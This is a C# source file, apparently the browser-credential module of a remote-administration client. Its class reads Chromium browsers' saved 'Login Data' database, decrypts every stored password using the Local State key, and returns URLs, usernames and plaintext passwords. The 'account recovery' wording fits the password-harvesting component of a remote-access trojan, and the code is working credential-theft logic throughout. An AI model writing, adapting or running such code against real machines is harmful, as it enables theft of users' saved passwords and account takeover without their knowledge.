using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides basic account recovery capabilities from chromium-based applications.
    /// </summary>
    public abstract class ChromiumBase
    {
        /// <summary>
        /// The name of the application.
        /// </summary>
        public abstract string ApplicationName { get; }

        /// <summary>
        /// Reads the stored accounts.
        /// </summary>
        /// <returns>A list of recovered accounts.</returns>
        public abstract List<RecoveredAccount> ReadAccounts();

        /// <summary>
        /// Reads the stored accounts of a chromium-based application.
        /// </summary>
        /// <param name="filePath">The file path of the logins database.</param>
        /// <param name="localStatePath">The file path to the local state.</param>
        /// <returns>A list of recovered accounts.</returns>
        protected List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath)
        {
            var result = new List<RecoveredAccount>();

            if (!File.Exists(filePath))
            {
                Console.WriteLine($"{ApplicationName}: Login Data file not found at {filePath}");
                return result;
            }

            try
            {
                var decryptor = new ChromiumDecryptor(localStatePath);

                using (var sqlDatabase = new SQLiteHandler(filePath))
                {
                    var loginDataList = sqlDatabase.ReadLogins();

                    foreach (var loginData in loginDataList)
                    {
                        try
                        {
                            var host = loginData.Url;
                            var user = loginData.Username;

                            // Decrypt the password
                            var pass = decryptor.Decrypt(loginData.EncryptedPassword);

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                            {
                                result.Add(new RecoveredAccount
                                {
                                    Url = host,
                                    Username = user,
                                    Password = pass,
                                    Application = ApplicationName
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            // Ignore invalid entries
                            Console.WriteLine($"{ApplicationName}: Failed to decrypt entry - {ex.Message}");
                        }
                    }
                }

                Console.WriteLine($"{ApplicationName}: Successfully recovered {result.Count} passwords");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{ApplicationName}: Error reading accounts - {ex.Message}");
            }

            return result;
        }
    }
}